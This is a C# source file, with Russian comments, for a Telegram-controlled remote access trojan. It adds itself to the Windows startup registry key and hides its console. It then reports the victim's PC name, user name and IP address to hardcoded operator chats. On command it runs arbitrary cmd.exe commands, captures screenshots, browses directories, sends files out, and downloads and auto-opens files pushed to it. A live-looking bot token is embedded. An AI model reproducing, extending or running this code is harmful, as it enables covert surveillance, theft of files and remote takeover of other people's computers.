using Microsoft.Win32;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Polling;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    private static ITelegramBotClient botClient;
    private static string botToken = "7776938290:AAEWP37--eTQban7H1YvoI1g16cRRRx59B4";
    private static List<long> adminChatIds = new List<long> { 305696040, 1705409334 };
    private static string pcName = Environment.MachineName;
    private static Dictionary<long, string> selectedPc = new Dictionary<long, string>();
    private static Dictionary<string, int> pcNumbers = new Dictionary<string, int>();
    private static int nextPcNumber = 1;
    private static string uniqueId = GetUniqueId();
    private static string commandPrefix => $"/user{uniqueId} ";
    private static string onlineFile = "online_clients.txt";
    private static DateTime startTime = DateTime.Now;

    static async Task Main(string[] args)
    {
        // Добавляем в автозагрузку
        AddToStartup();

        // Скрываем консоль
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // Инициализация бота
        Console.WriteLine("Инициализация бота...");
        botClient = new TelegramBotClient(botToken);
        var me = await botClient.GetMeAsync();
        Console.WriteLine($"Бот {me.Username} успешно запущен на компьютере {pcName} (ID: {uniqueId})!");
        // Отправляем владельцу информацию о новом подключении
        string info = $"🖥️ Новый клиент подключён!\n" +
            $"Имя ПК: {pcName}\n" +
            $"Пользователь: {Environment.UserName}\n" +
            $"IP-адрес: {GetLocalIpAddress()}\n" +
            $"ID: {uniqueId}\n" +
            $"Время: {DateTime.Now}";
        foreach (var chatId in adminChatIds)
        {
            try { await botClient.SendTextMessageAsync(chatId, info); } catch { }
        }

        // Записываем информацию о себе в файл online_clients.txt
        try
        {
            string infoLine = $"{pcName}|{Environment.UserName}|{uniqueId}|{GetLocalIpAddress()}|{startTime:yyyy-MM-dd HH:mm:ss}";
            System.IO.File.AppendAllLines(onlineFile, new[] { infoLine });
        }
        catch { }

        var receiverOptions = new ReceiverOptions
        {
            AllowedUpdates = new[] { UpdateType.Message },
            ThrowPendingUpdates = true
        };

        botClient.StartReceiving(
            updateHandler: HandleUpdateAsync,
            pollingErrorHandler: HandlePollingErrorAsync,
            receiverOptions: receiverOptions,
            cancellationToken: CancellationToken.None
        );

        // Держим программу запущенной
        await Task.Delay(-1);
    }

    private static void AddToStartup()
    {
        try
        {
            string appName = "TEST"; // Уникальное имя для записи
            string exePath = Process.GetCurrentProcess().MainModule.FileName;

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                // Проверяем существующую запись
                object currentValue = key.GetValue(appName);

                // Если путь изменился или запись отсутствует
                if (currentValue == null || currentValue.ToString() != exePath)
                {
                    key.SetValue(appName, exePath);
                    Console.WriteLine("Обновлена запись в автозагрузке");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ошибка автозагрузки: {ex.Message}");
        }
    }

    private static async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
    {
        if (update.Message == null)
            return;

        if (!adminChatIds.Contains(update.Message.Chat.Id))
        {
            await botClient.SendTextMessageAsync(
                chatId: update.Message.Chat.Id,
                text: "У вас нет доступа к этому боту."
            );
            return;
        }

        // Обработка документов
        if (update.Message.Type == MessageType.Document)
        {
            try
            {
                var file = await botClient.GetFileAsync(update.Message.Document.FileId);
                string fileName = update.Message.Document.FileName;
                string filePath = Path.Combine(Path.GetTempPath(), fileName);

                using (var saveStream = new FileStream(filePath, FileMode.Create))
                {
                    await botClient.DownloadFileAsync(file.FilePath, saveStream);
                }

                // Автоматически открываем файл
                Process.Start(new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true
                });

                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Файл {fileName} успешно загружен и открыт"
                );
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при загрузке файла: {ex.Message}"
                );
            }
            return;
        }

        if (update.Message.Type != MessageType.Text)
            return;

        var message = update.Message.Text;
        // --- Разрешаем /help, /pcs, /start, /online без префикса ---
        if (message.Trim().Equals("/help", StringComparison.OrdinalIgnoreCase))
        {
            await SendHelpMessage(update.Message.Chat.Id);
            return;
        }
        if (message.Trim().Equals("/pcs", StringComparison.OrdinalIgnoreCase))
        {
            await SendPcList(update.Message.Chat.Id);
            return;
        }
        if (message.Trim().Equals("/start", StringComparison.OrdinalIgnoreCase))
        {
            await SendHelpMessage(update.Message.Chat.Id);
            return;
        }
        if (message.Trim().Equals("/online", StringComparison.OrdinalIgnoreCase))
        {
            await SendOnlineList(update.Message.Chat.Id);
            return;
        }
        // --- Остальные команды только по префиксу ---
        if (!message.StartsWith(commandPrefix, StringComparison.OrdinalIgnoreCase))
            return; // Фильтрация по префиксу
        var command = message.Substring(commandPrefix.Length).Trim().ToLower();

        if (command == "screenshot")
        {
            try
            {
                using (var bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (var graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                    }

                    using (var ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        ms.Position = 0;
                        await botClient.SendPhotoAsync(
                            chatId: update.Message.Chat.Id,
                            photo: new InputFileStream(ms, "screenshot.jpg"),
                            caption: $"Скриншот рабочего стола ({pcName})"
                        );
                    }
                }
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при создании скриншота: {ex.Message}"
                );
            }
        }
        else if (command.StartsWith("cmd "))
        {
            string cmdText = command.Substring(4);
            try
            {
                var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c {cmdText}";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();
                await process.WaitForExitAsync();

                string result = string.IsNullOrEmpty(output) ? "Команда выполнена, но не вернула результат" : output;
                if (!string.IsNullOrEmpty(error))
                {
                    result += $"\nОшибка: {error}";
                }

                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Результат выполнения команды:\n```\n{result}\n```",
                    parseMode: ParseMode.Markdown
                );
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при выполнении команды: {ex.Message}"
                );
            }
        }
        else if (command.StartsWith("ls"))
        {
            string path = command.Length > 2 ? command.Substring(2).Trim() : ".";
            try
            {
                // Нормализация пути
                if (path.StartsWith("\\") || path.StartsWith("/"))
                {
                    path = path.Substring(1);
                }
                path = path.Replace('/', '\\');

                if (!Directory.Exists(path))
                {
                    await botClient.SendTextMessageAsync(
                        chatId: update.Message.Chat.Id,
                        text: $"Директория не существует: {path}"
                    );
                    return;
                }

                var directories = Directory.GetDirectories(path);
                var files = Directory.GetFiles(path);

                var response = new System.Text.StringBuilder();
                response.AppendLine($"Содержимое {path}:");
                response.AppendLine("\nДиректории:");
                foreach (var dir in directories)
                {
                    response.AppendLine($"📁 {Path.GetFileName(dir)}");
                }
                response.AppendLine("\nФайлы:");
                foreach (var file in files)
                {
                    var fileInfo = new FileInfo(file);
                    response.AppendLine($" {Path.GetFileName(file)} ({fileInfo.Length / 1024} KB)");
                }

                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: response.ToString()
                );
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при просмотре директории: {ex.Message}"
                );
            }
        }
        else if (command.StartsWith("download "))
        {
            string filePath = command.Substring(9).Trim();
            try
            {
                // Нормализация пути
                if (filePath.StartsWith("\\") || filePath.StartsWith("/"))
                {
                    filePath = filePath.Substring(1);
                }
                filePath = filePath.Replace('/', '\\');

                if (!System.IO.File.Exists(filePath))
                {
                    await botClient.SendTextMessageAsync(
                        chatId: update.Message.Chat.Id,
                        text: $"Файл не существует: {filePath}"
                    );
                    return;
                }

                var fileInfo = new FileInfo(filePath);
                if (fileInfo.Length > 50 * 1024 * 1024) // 50MB limit
                {
                    await botClient.SendTextMessageAsync(
                        chatId: update.Message.Chat.Id,
                        text: "Файл слишком большой (максимум 50MB)"
                    );
                    return;
                }

                using (var stream = System.IO.File.OpenRead(filePath))
                {
                    await botClient.SendDocumentAsync(
                        chatId: update.Message.Chat.Id,
                        document: new InputFileStream(stream, Path.GetFileName(filePath)),
                        caption: $"Файл: {Path.GetFileName(filePath)}"
                    );
                }
            }
            catch (Exception ex)
            {
                await botClient.SendTextMessageAsync(
                    chatId: update.Message.Chat.Id,
                    text: $"Ошибка при скачивании файла: {ex.Message}"
                );
            }
        }
    }

    private static async Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
    {
        Console.WriteLine($"Ошибка при получении обновлений: {exception.Message}");
    }

    private static async Task SendPcList(long chatId)
    {
        string msg = $"Этот ПК: {pcName}\nПользователь: {Environment.UserName}\nID: {uniqueId}\nIP: {GetLocalIpAddress()}";
        await botClient.SendTextMessageAsync(chatId, msg);
    }

    private static async Task SendHelpMessage(long chatId)
    {
        string helpText =
            $"Доступные команды:\n\n" +
            $"/help - показать это сообщение\n" +
            $"/pcs - информация об этом ПК\n" +
            $"/online - список всех онлайн-клиентов\n" +
            $"{commandPrefix}screenshot - сделать скриншот рабочего стола\n" +
            $"{commandPrefix}cmd <команда> - выполнить команду на этом ПК\n" +
            $"{commandPrefix}ls [путь] - показать содержимое директории\n" +
            $"{commandPrefix}download <путь_к_файлу> - скачать файл\n\n" +
            "Также вы можете отправить любой файл, и он будет автоматически открыт на целевом компьютере (без префикса).";
        await botClient.SendTextMessageAsync(chatId, helpText);
    }

    private static async Task SendOnlineList(long chatId)
    {
        try
        {
            if (!System.IO.File.Exists(onlineFile))
            {
                await botClient.SendTextMessageAsync(chatId, "Нет информации о клиентах онлайн.");
                return;
            }
            var lines = System.IO.File.ReadAllLines(onlineFile).Reverse().Distinct().Reverse().ToList();
            var sb = new System.Text.StringBuilder();
            sb.AppendLine("Список онлайн-клиентов:");
            foreach (var line in lines)
            {
                var parts = line.Split('|');
                if (parts.Length >= 5)
                {
                    sb.AppendLine($"ID: {parts[2]}, Имя ПК: {parts[0]}, IP: {parts[3]}");
                }
            }
            await botClient.SendTextMessageAsync(chatId, sb.ToString());
        }
        catch (Exception ex)
        {
            await botClient.SendTextMessageAsync(chatId, $"Ошибка при получении списка: {ex.Message}");
        }
    }

    // Генерация уникального ID на основе имени ПК и MAC-адреса
    private static string GetUniqueId()
    {
        try
        {
            string mac = NetworkInterface.GetAllNetworkInterfaces()
                .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .Select(nic => nic.GetPhysicalAddress().ToString())
                .FirstOrDefault() ?? "00";
            string raw = pcName + mac;
            int hash = raw.GetHashCode();
            return Math.Abs(hash).ToString();
        }
        catch
        {
            return Guid.NewGuid().ToString("N").Substring(0, 8);
        }
    }

    private static string GetLocalIpAddress()
    {
        try
        {
            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    return ip.ToString();
            }
            return "нет IPv4";
        }
        catch { return "неизвестно"; }
    }
}
